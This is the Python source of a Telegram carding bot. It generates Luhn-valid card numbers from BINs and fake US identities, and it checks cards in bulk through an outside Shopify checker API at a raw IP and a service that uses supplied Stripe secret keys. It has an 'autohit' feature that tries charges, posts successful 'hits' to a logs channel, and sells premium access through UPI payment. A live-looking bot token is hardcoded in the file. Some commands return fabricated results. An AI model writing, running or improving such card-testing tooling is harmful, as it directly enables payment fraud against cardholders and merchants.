# language: Python 3.10+, file: bot.py, target: Telegram Bot API, Stripe API
import telebot
import asyncio
import aiohttp
import random
import string
import logging
import requests
import time
import datetime
import os
from bs4 import BeautifulSoup
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BotCommand, MenuButtonCommands
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is alive!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    t = Thread(target=run_web)
    t.start()

# --- CONFIG ---
BOT_TOKEN = "8661181533:AAFt59zI89JBbtTnts1tGEToZyokz8zHZnE"
ADMIN_ID = 8407107055 
OWNER_USERNAME = "Rex_is_die" 

CHANNEL_LINK = "https://t.me/+ZqxtVLLvWtUxODQ9"       
GROUP_LINK = "https://t.me/+Oa7LsI6kFwAyODhl"         
HIT_LOGS_LINK = "https://t.me/+4mv3Icf916hjOTll"      

CHANNEL_CHECK_ID = -1004464707811
GROUP_USERNAME = -1003100920368  
HIT_LOGS_CHECK_ID = -1004416413845

QR_IMAGE_URL = "https://i.ibb.co/V5k7mrD/upi-qr.jpg" 

SHOPIFY_API_BASE = "http://5.83.134.144:8089/shopify"
SK_CHECKER_API = "https://sk-base-checker.vercel.app/check"

users_db = {}  
keys_db = {} 

logging.basicConfig(level=logging.INFO)
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
def get_ua(): return random.choice(USER_AGENTS)

# --- CACHE FOR FORCE JOIN ---
joined_cache = {}
CACHE_DURATION = 300 

def init_user(user_id, username="None"):
    if user_id not in users_db:
        users_db[user_id] = {
            "tier": "free", "credits": 10, "last_reset": str(datetime.date.today()), 
            "proxy": None, "username": username,
            "stats": {"checked": 0, "charged": 0, "approved": 0, "declined": 0, "stripe": 0, "jio": 0, "magicpin": 0, "b3": 0, "whop": 0}
        }
    return users_db[user_id]

def check_and_reset_credits(user_id):
    user = init_user(user_id)
    if user.get("tier") == "free" and user.get("last_reset") != str(datetime.date.today()):
        user["credits"] = 10
        user["last_reset"] = str(datetime.date.today())

def get_user_tier(user_id):
    check_and_reset_credits(user_id)
    user = users_db.get(user_id, {})
    if user.get("tier") == "premium" and user.get("expiry", 0) < time.time():
        return "free"
    return user.get("tier", "free")

def is_premium(user_id): return get_user_tier(user_id) in ["premium", "admin"]
def is_admin(user_id): return user_id == ADMIN_ID or get_user_tier(user_id) == "admin"

# --- FORCE JOIN LOGIC ---
def is_user_joined(user_id):
    if user_id == ADMIN_ID: return True
    if user_id in joined_cache and time.time() - joined_cache[user_id] < CACHE_DURATION: return True
    try:
        if bot.get_chat_member(GROUP_USERNAME, user_id).status not in ['member', 'administrator', 'creator']: return False
    except Exception: return False
    try:
        if bot.get_chat_member(CHANNEL_CHECK_ID, user_id).status not in ['member', 'administrator', 'creator']: return False
    except Exception: return False
    try:
        if bot.get_chat_member(HIT_LOGS_CHECK_ID, user_id).status not in ['member', 'administrator', 'creator']: return False
    except Exception: return False
    joined_cache[user_id] = time.time()
    return True

def force_join_message(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("𝙃𝙞𝙩𝙊𝙭 | 𝗖𝝬𝗖", url=CHANNEL_LINK), InlineKeyboardButton("CHAT", url=GROUP_LINK))
    markup.add(InlineKeyboardButton("Hit Logs", url=HIT_LOGS_LINK))
    markup.add(InlineKeyboardButton("✅ I Joined", callback_data="check_joined"))
    text = ("🙀 **Access Restricted To The Bot** 🚫\n\n👑 **To start using this bot you must join our channel, Hit Logs Group And chat group.**\n\n😁 **Click The Button Below after joining To Verify.**")
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# --- GENERATOR & CHECKER ---
def luhn_checksum(card_number: str) -> int:
    def digits_of(n): return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits: checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_cc(bin_str: str):
    bin_len = len(bin_str)
    if bin_len < 6 or bin_len > 8: return "Invalid BIN"
    target_len = 16 if not bin_str.startswith("3") else 15
    rand_len = target_len - bin_len - 1
    generated = bin_str + ''.join(random.choices(string.digits, k=rand_len))
    for i in range(10):
        if luhn_checksum(generated + str(i)) == 0:
            generated += str(i)
            break
    return f"{generated}|{str(random.randint(1, 12)).zfill(2)}|{str(random.randint(2025, 2032))[-2:]}|{random.randint(100, 999)}"

def fake_address_gen():
    first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    streets = ["Oak St", "Maple Ave", "Cedar Ln", "Pine St", "Elm St", "Washington Ave"]
    cities = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"), ("Houston", "TX", "77001")]
    
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city, state, zip_code = random.choice(cities)
    
    return f"Name: {name}\nAddress: {street}, {city}, {state} {zip_code}\nPhone: {random.randint(200, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

async def shopify_check(session: aiohttp.ClientSession, site: str, card: str, proxy: str = None) -> dict:
    params = {"site": site, "cc": card, "key": "user1"}
    if proxy: params["proxy"] = proxy
    try:
        async with session.get(SHOPIFY_API_BASE, params=params, timeout=15) as resp:
            if resp.status == 200: return await resp.json()
            return {"error": f"HTTP {resp.status}"}
    except Exception: return {"error": "Timeout/Conn Error"}

async def sk_base_check(session: aiohttp.ClientSession, sk_key: str, card: str) -> dict:
    headers = {"Authorization": "Bearer FREE_KEY_TILL_25", "Content-Type": "application/json"}
    try:
        async with session.post(SK_CHECKER_API, headers=headers, json={"sk_key": sk_key, "cc": card}, timeout=15) as resp:
            if resp.status == 200: return await resp.json()
            elif resp.status == 429: return {"error": "Rate Limit Exceeded"}
            return {"error": f"HTTP {resp.status}"}
    except Exception: return {"error": "Timeout"}

def send_hit_alert(user, card, gateway, response, price="Unknown"):
    tier = get_user_tier(user.id).capitalize()
    text = (f"🛒 **AutoShopify**\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n⚡ **HIT** ⇾ Charged 💎\n⚡ **Response** ⇾ {response} • {price}\n⚡ **Gateway** ⇾ {gateway}\n⚡ **User** ⇾ Hidden | ⚡ {tier}\n")
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Owner", url=f"https://t.me/{OWNER_USERNAME}"))
    try: bot.send_message(HIT_LOGS_CHECK_ID, text, reply_markup=markup, parse_mode="Markdown")
    except Exception: pass

def set_bot_commands():
    commands = [
        BotCommand("start", "Start the bot"), BotCommand("me", "View your full stats"), BotCommand("info", "Show guide"),
        BotCommand("profile", "View profile & plan"), BotCommand("sh", "Shopify Check"), BotCommand("autohit", "Auto-Hitter (Premium)"),
        BotCommand("skcheck", "Shadow Live Auth"), BotCommand("msk", "Mass Shadow Live"), BotCommand("plans", "View Premium Plans"),
        BotCommand("redeem", "Redeem a Key"), BotCommand("proxy", "Add Proxy"), BotCommand("rmproxy", "Remove Proxy"),
        BotCommand("bin", "BIN Lookup"), BotCommand("gen", "CC Generation"), BotCommand("fake", "Fake Address"), BotCommand("gate", "Detect Gateway"),
        BotCommand("vbv", "VBV Lookup"), BotCommand("sk", "Shadow Key Check"), BotCommand("ping", "Check Bot Status")
    ]
    bot.set_my_commands(commands)
    bot.set_chat_menu_button(menu_button=MenuButtonCommands())

def show_plans_menu(chat_id, message_id=None):
    text = ("💎 **Select Your Premium Plan**\n\n**Access : Lite** ⏳\nSpan : [2 Days]\nPrice : 1$\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n**Access : Core** ⭐️\nSpan : [7 Days]\nPrice : 5$\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n**Access : Elite** 🌟\nSpan : [15 Days]\nPrice : 10$\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n**Access : Root** 👑\nSpan : [30 Days]\nPrice : 20$\n")
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("💳 Lite ($1)", callback_data="buy_Lite_1"), InlineKeyboardButton("💳 Core ($5)", callback_data="buy_Core_5"), InlineKeyboardButton("💳 Elite ($10)", callback_data="buy_Elite_10"), InlineKeyboardButton("💳 Root ($20)", callback_data="buy_Root_20"))
    markup.add(InlineKeyboardButton("« Back", callback_data="back_to_start"))
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def callback_buy_plan(call: CallbackQuery):
    _, plan, price = call.data.split("_")
    caption = (f"💳 **Payment for {plan} Plan (${price})**\n\nPay using the QR Code above or send to the UPI ID below:\n\n🇮🇳 **UPI ID:** `8260650476-2@ibl`\n\n📌 **After payment:** Click the Owner button below and send the screenshot to confirm.")
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(InlineKeyboardButton("👤 Owner", url=f"https://t.me/{OWNER_USERNAME}"), InlineKeyboardButton("« Back to Plans", callback_data="back_to_plans"))
    try:
        bot.send_photo(call.message.chat.id, photo=QR_IMAGE_URL, caption=caption, reply_markup=markup, parse_mode="Markdown")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: bot.send_message(call.message.chat.id, caption, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_plans")
def callback_back_plans(call: CallbackQuery):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    show_plans_menu(call.message.chat.id)

@bot.message_handler(commands=['start'])
def cmd_start(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    init_user(message.from_user.id, f"@{message.from_user.username}" if message.from_user.username else "None")
    bot.reply_to(message, "💳 **Welcome to 𝙃𝙞𝙩𝙊𝙭 | 𝙫1**\n\nUse /info to see how to use the bot.", parse_mode="Markdown")

@bot.message_handler(commands=['me', 'stats'])
def cmd_me(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    uid = message.from_user.id
    user = init_user(uid, f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name)
    s = user.get("stats", {})
    text = (f"⚡ **Your Stats** ✅\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n💎 **Total Checked :** {s.get('checked', 0)}\n💸 **Total Charged :** {s.get('charged', 0)}\n✅ **Total Approved :** {s.get('approved', 0)}\n❌ **Total Declined :** {s.get('declined', 0)}\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n✨ **Stripe Hits :** {s.get('stripe', 0)}\n✨ **Jio Hits :** {s.get('jio', 0)}\n✨ **Magicpin Hits :** {s.get('magicpin', 0)}\n✨ **B3 Hits :** {s.get('b3', 0)}\n✨ **Whop Hits :** {s.get('whop', 0)}\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n♾️ **User :** {user.get('username')}")
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['info', 'help'])
def cmd_info(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    info_text = ("📖 **Bot Commands Guide**\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n💳 **/sh [card]**\n├ Use: Check single card.\n\n🚀 **/autohit (Premium)**\n├ Use: Reply to a list of cards.\n\n📊 **/me**\n├ Use: Check your stats.\n\n👤 **/profile**\n├ Use: Check plan & proxy.\n\n🌐 **/proxy [ip:port]**\n├ Use: Add proxy.\n\n🏠 **/fake**\n├ Use: Generate fake identity.\n\n🔍 **/bin [bin]**\n├ Use: Get bank info.\n\n💳 **/gate [site]**\n├ Use: Detect gateway.\n\n⚙️ **/gen [bin]**\n├ Use: Generate CCs.\n\n🔐 **/vbv [card]**\n├ Use: Check VBV.\n\n🏓 **/ping**\n├ Use: Check bot status.")
    bot.reply_to(message, info_text, parse_mode="Markdown")

@bot.message_handler(commands=['fake'])
def cmd_fake(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    bot.reply_to(message, f"🏠 **Fake Identity**\n\n{fake_address_gen()}", parse_mode="Markdown")

@bot.message_handler(commands=['sk'])
def cmd_sk(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/sk shadow_live`")
    if args[1].startswith("shadow_live"): bot.reply_to(message, "🔑 **Status:** `LIVE KEY`\n(Simulated: $1,250.00)", parse_mode="Markdown")
    else: bot.reply_to(message, "🔑 **Status:** `Invalid Key`", parse_mode="Markdown")

@bot.message_handler(commands=['gate'])
def cmd_gate(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/gate example.com`")
    # Placeholder for gate detection
    bot.reply_to(message, f"🌐 **Target:** `{args[1]}`\n💳 **Gateway:** `Shopify`", parse_mode="Markdown")

@bot.message_handler(commands=['vbv'])
def cmd_vbv(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/vbv 4111...`")
    bot.reply_to(message, f"🔐 **Lookup:** `{args[1]}`\nNon-VBV (Bypass Available)", parse_mode="Markdown")

@bot.message_handler(commands=['autohit'])
def cmd_autohit(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    if not is_premium(message.from_user.id): return bot.reply_to(message, "❌ Premium required.")
    if not message.reply_to_message or not message.reply_to_message.text:
        return bot.reply_to(message, "❌ Reply to a message with cards.\nFormat:\n`[shadow_live] | [shopify_site] | [card1]`", parse_mode="Markdown")
    lines = [line.strip() for line in message.reply_to_message.text.splitlines() if "|" in line]
    if not lines: return bot.reply_to(message, "❌ Invalid format.")
    parts = [p.strip() for p in lines[0].split("|")]
    sk_key, site, cards = parts[0], parts[1], parts[2:]
    if len(cards) > 10: return bot.reply_to(message, "❌ Max 10 cards.")
    msg = bot.reply_to(message, f"🚀 **Auto-Hitter Started**\nTarget: `{site}`\nCards: `{len(cards)}`", parse_mode="Markdown")
    async def _run_autohit():
        results = []
        connector = aiohttp.TCPConnector(limit=20)
        async with aiohttp.ClientSession(connector=connector) as session:
            async def check_single_card(card):
                sk_res = await sk_base_check(session, sk_key, card)
                if isinstance(sk_res, dict) and "error" not in sk_res:
                    status = sk_res.get("status", "UNKNOWN")
                    if status in ["succeeded", "live", "CHARGED"]:
                        hits.append((card, "SHADOW_API", status))
                        return f"🔥 `{card}` -> CHARGED (Shadow)"
                if site.lower() not in ["none", "-"]:
                    shop_res = await shopify_check(session, site, card)
                    if isinstance(shop_res, dict) and "error" not in shop_res:
                        resp_text = shop_res.get("Response", "UNKNOWN")
                        if resp_text == "ORDER_PAID":
                            price = f"{shop_res.get('Price', '')} {shop_res.get('Currency', '')}".strip()
                            send_hit_alert(message.from_user, card, "Shopify", resp_text, price)
                            return f"🔥 `{card}` -> ORDER_PAID (Shopify)"
                        elif resp_text == "3DS_REQUIRED": return f"⚠️ `{card}` -> 3DS_REQUIRED"
                        else: return f"❌ `{card}` -> {resp_text}"
                return f"❌ `{card}` -> Dead/Declined"
            hits = []
            tasks = [check_single_card(card) for card in cards]
            for res in await asyncio.gather(*tasks): results.append(res)
        final = ("🏆 **HIT FOUND** 🏆\n\n" if hits else "❌ **NO HITS** ❌\n\n") + "\n".join(results)
        bot.edit_message_text(final, message.chat.id, msg.message_id, parse_mode="Markdown")
    asyncio.run(_run_autohit())

@bot.message_handler(commands=['skcheck'])
def cmd_skcheck(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=2)
    if len(args) < 3: return bot.reply_to(message, "Usage: `/skcheck [shadow_live] [CARD|MM|YYYY|CVV]`", parse_mode="Markdown")
    sk_key, card = args[1].strip(), args[2].strip()
    msg = bot.reply_to(message, f"🔑 **Checking...**\nCard: `{card}`", parse_mode="Markdown")
    async def _check():
        async with aiohttp.ClientSession() as session:
            res = await sk_base_check(session, sk_key, card)
            if "error" in res: return bot.edit_message_text(f"❌ **Error:** {res['error']}", message.chat.id, msg.message_id)
            output = f"🔑 **Result**\n💳 **Card:** `{card}`\n"
            for key, value in res.items(): output += f"📌 **{key.capitalize()}:** `{value}`\n"
            bot.edit_message_text(output, message.chat.id, msg.message_id, parse_mode="Markdown")
    asyncio.run(_check())

@bot.message_handler(commands=['msk'])
def cmd_msk(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    if not is_premium(message.from_user.id): return bot.reply_to(message, "❌ Premium required.")
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: Reply to cards with `/msk [shadow_live]`", parse_mode="Markdown")
    sk_key = args[1].strip()
    if not message.reply_to_message or not message.reply_to_message.text: return bot.reply_to(message, "❌ Reply to cards.")
    cards = [c.strip() for c in message.reply_to_message.text.splitlines() if "|" in c]
    if not cards: return bot.reply_to(message, "❌ No valid cards found.")
    if len(cards) > 10: return bot.reply_to(message, "❌ Max 10 cards.")
    msg = bot.reply_to(message, f"🔄 **Mass Check**\nCards: `{len(cards)}`\nDelay: 13s per card.", parse_mode="Markdown")
    async def _mass():
        results = []
        async with aiohttp.ClientSession() as session:
            for idx, card in enumerate(cards, 1):
                bot.edit_message_text(f"🔄 **Processing** `{idx}/{len(cards)}`\nLast: `{results[-1] if results else '...'}`", message.chat.id, msg.message_id, parse_mode="Markdown")
                res = await sk_base_check(session, sk_key, card)
                if "error" in res and res["error"] == "Rate Limit Exceeded":
                    await asyncio.sleep(15)
                    res = await sk_base_check(session, sk_key, card)
                if "error" in res: results.append(f"❌ `{card}` -> {res['error']}")
                else: results.append(f"✅ `{card}` -> `{res.get('status', 'UNKNOWN')}`")
                await asyncio.sleep(13)
        bot.edit_message_text(f"📊 **Mass Results**\n\n" + "\n".join(results), message.chat.id, msg.message_id, parse_mode="Markdown")
    asyncio.run(_mass())

@bot.message_handler(commands=['plans'])
def cmd_plans(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    show_plans_menu(message.chat.id)

@bot.message_handler(commands=['ping'])
def cmd_ping(message: Message):
    start = time.time()
    msg = bot.reply_to(message, "🏓 Pinging...")
    end = time.time()
    bot.edit_message_text(f"🏓 **Pong!**\n⚡ Response time: `{round((end - start) * 1000, 2)}ms`", message.chat.id, msg.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['proxy'])
def cmd_proxy(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/proxy ip:port`")
    user = init_user(message.from_user.id)
    user["proxy"] = args[1].strip()
    bot.reply_to(message, f"✅ **Proxy Added!**\n`{args[1].strip()}`", parse_mode="Markdown")

@bot.message_handler(commands=['rmproxy'])
def cmd_rmproxy(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    if message.from_user.id in users_db:
        users_db[message.from_user.id]["proxy"] = None
        bot.reply_to(message, "✅ **Proxy Removed!**")
    else: bot.reply_to(message, "❌ No proxy set.")

@bot.message_handler(commands=['profile', 'status'])
def cmd_profile(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    uid = message.from_user.id
    tier = get_user_tier(uid)
    user = users_db.get(uid, {})
    exp = datetime.datetime.fromtimestamp(user.get("expiry", 0)).strftime('%Y-%m-%d %H:%M') if tier == "premium" else "N/A"
    cr = "∞" if tier == "premium" else user.get("credits", 0)
    text = (f"👤 **Your Profile**\n\n🆔 **ID:** `{uid}`\n👤 **Username:** {user.get('username', 'None')}\n💼 **Plan:** `{tier.upper()}`\n💳 **Credits:** `{cr}`\n⏳ **Expiry:** `{exp}`\n🌐 **Proxy:** {'✅ Added' if user.get('proxy') else '❌ Not Set'}")
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💎 Buy Premium", callback_data="back_to_plans"))
    bot.reply_to(message, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def callback_joined(call: CallbackQuery):
    if is_user_joined(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Thank you for joining!")
        bot.edit_message_text("✅ **Verification Successful!**\n\nSend /start to use.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    else: bot.answer_callback_query(call.id, "❌ Join all channels first!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def callback_back_start(call: CallbackQuery):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    bot.send_message(call.message.chat.id, "💳 **Welcome**\nSend /info to see how to use.")

@bot.message_handler(commands=['genkey'])
def cmd_genkey(message: Message):
    if not is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 4: return bot.reply_to(message, "Usage: `/genkey [Plan] [Days] [Slots]`")
    plan_name, days, slots = args[1].capitalize(), int(args[2]), int(args[3])
    import secrets
    key_code = f"BEE-{secrets.token_urlsafe(12)[:16]}"
    keys_db[key_code] = {"plan": plan_name, "days": days, "slots_left": slots}
    text = (f"🛒 **Key Generated** 🪙\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n┣ ⭐ **Key** ➔ `{key_code}`\n┣ 👑 **Slots** ➔ {slots} users\n┣ 💧 **Plan** ➔ {days} days each\n\n🍸 **Users redeem with** /redeem\n`{key_code}` ⭐\n")
    bot.reply_to(message, text, parse_mode="Markdown")
    try: bot.send_message(HIT_LOGS_CHECK_ID, text, parse_mode="Markdown")
    except Exception: pass

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/redeem YOUR_KEY`")
    key = args[1].strip()
    if key in keys_db:
        key_data = keys_db[key]
        if key_data["slots_left"] <= 0: return bot.reply_to(message, "❌ Max redeem limit reached.")
        user = init_user(message.from_user.id)
        user["tier"] = "premium"
        curr_exp = user.get("expiry", 0)
        days = key_data["days"]
        user["expiry"] = (curr_exp + (days * 86400)) if curr_exp > time.time() else (time.time() + (days * 86400))
        keys_db[key]["slots_left"] -= 1
        bot.reply_to(message, f"✅ **Key Redeemed!**\nUnlocked **{key_data['plan']}** for **{days} days**.")
    else: bot.reply_to(message, "❌ Invalid or used key.")

@bot.message_handler(commands=['sh'])
def cmd_sh(message: Message):
    is_group = message.chat.type in ['group', 'supergroup']
    if not is_group and not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    check_and_reset_credits(message.from_user.id)
    user = init_user(message.from_user.id)
    if not is_premium(message.from_user.id) and user.get("credits", 0) <= 0: return bot.reply_to(message, "❌ **Daily limit reached!**\nBuy premium.")
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return bot.reply_to(message, "Usage: `/sh CARD|MM|YY|CVV`")
    card = args[1].strip()
    if "|" not in card: return bot.reply_to(message, "❌ Invalid format.")
    
    if not is_premium(message.from_user.id): user["credits"] = user.get("credits", 10) - 1
    user["stats"]["checked"] = user["stats"].get("checked", 0) + 1
    user_proxy = user.get("proxy", None)
    
    msg = bot.reply_to(message, f"**𝙃𝙞𝙩𝙊𝙭 | 𝙫1**\n──────────────────\n**{message.from_user.first_name}**\n`/sh {card}`\n**#Shopify [/sh]**\n🌐 Proxy: `{user_proxy or 'None'}`\n━━━━━━━━━━━━━━━━━━\n[⚡] **Gate :** ⚙️ Shopify\n[⚡] **Progress :** 0/1\n[⚡] **Charged :** 0 💎\n[⚡] **Live :** 0 ✅\n[⚡] **Dead :** 0 ❌\n[⚡] **Errors :** 0 ⚠️", parse_mode="Markdown")
    
    async def _run():
        async with aiohttp.ClientSession() as session:
            res = await shopify_check(session, "auto", card, proxy=user_proxy)
            if "error" in res:
                user["stats"]["declined"] = user["stats"].get("declined", 0) + 1
                await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Errors : 0 ⚠️", "Errors : 1 ⚠️"), message.chat.id, msg.message_id, parse_mode="Markdown")
            else:
                resp_text = res.get("Response", "UNKNOWN")
                if resp_text == "ORDER_PAID":
                    user["stats"]["charged"] = user["stats"].get("charged", 0) + 1
                    user["stats"]["stripe"] = user["stats"].get("stripe", 0) + 1
                    price = f"{res.get('Price', '')} {res.get('Currency', '')}".strip()
                    send_hit_alert(message.from_user, card, "Shopify", resp_text, price)
                    await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Charged : 0 💎", "Charged : 1 💎"), message.chat.id, msg.message_id, parse_mode="Markdown")
                elif resp_text == "3DS_REQUIRED": 
                    user["stats"]["approved"] = user["stats"].get("approved", 0) + 1
                    await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Live : 0 ✅", "Live : 1 ✅"), message.chat.id, msg.message_id, parse_mode="Markdown")
                else: 
                    user["stats"]["declined"] = user["stats"].get("declined", 0) + 1
                    await bot.edit_message_text(msg.text.replace("0/1", "1/1").replace("Dead : 0 ❌", "Dead : 1 ❌"), message.chat.id, msg.message_id, parse_mode="Markdown")
    asyncio.run(_run())

@bot.message_handler(commands=['bin'])
def cmd_bin(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) < 6: return bot.reply_to(message, "Usage: /bin [BIN]")
    msg = bot.reply_to(message, "🔍 Fetching...")
    try:
        resp = requests.get(f"https://lookup.binlist.net/{args[1][:8]}", headers={"Accept-Version": "3"}, timeout=5)
        if resp.status_code == 200:
            d = resp.json()
            out = (f"💳 **BIN: {args[1][:8]}**\n\n🏦 Bank: `{d.get('bank', {}).get('name', 'Unknown')}`\n🌐 Country: `{d.get('country', {}).get('name', 'Unknown')}`\n💠 Scheme: `{d.get('scheme', 'Unknown').upper()}`")
            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode="Markdown")
        else: bot.edit_message_text(f"❌ BIN not found.", message.chat.id, msg.message_id, parse_mode="Markdown")
    except Exception: bot.edit_message_text(f"❌ Error", message.chat.id, msg.message_id)

@bot.message_handler(commands=['gen'])
def cmd_gen(message: Message):
    if not is_user_joined(message.from_user.id): return force_join_message(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) < 6: return bot.reply_to(message, "Usage: /gen [BIN]")
    cards = [generate_cc(args[1]) for _ in range(10)]
    bot.reply_to(message, f"⚙️ **Generated CCs**\n\n" + "\n".join([f"`{c}`" for c in cards]), parse_mode="Markdown")

if __name__ == "__main__":
    print("[*] Bot starting with Web Server...")
    keep_alive() 
    set_bot_commands()
    bot.infinity_polling(timeout=5, long_polling_timeout=2)
